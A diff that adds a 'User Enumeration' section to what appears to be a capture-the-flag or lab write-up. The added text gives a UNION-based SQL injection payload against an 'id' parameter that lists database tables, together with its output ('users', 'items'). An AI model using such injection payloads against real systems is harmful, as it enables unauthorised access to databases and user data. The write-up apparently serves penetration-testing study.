@@ -75,6 +75,22 @@ park
 ```bash
 Ubuntu 16.04
 ```
+---
+
+## 🗃️ User Enumeration
+
+After bypassing the filters, the next step was enumerating tables and columns inside the database.
+
+### Discover Tables
+
+```sql
+?id=2 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()--
+```
+Returned:
+```bash
+users
+items
+```
 
 🛡️ WAF Bypass
 
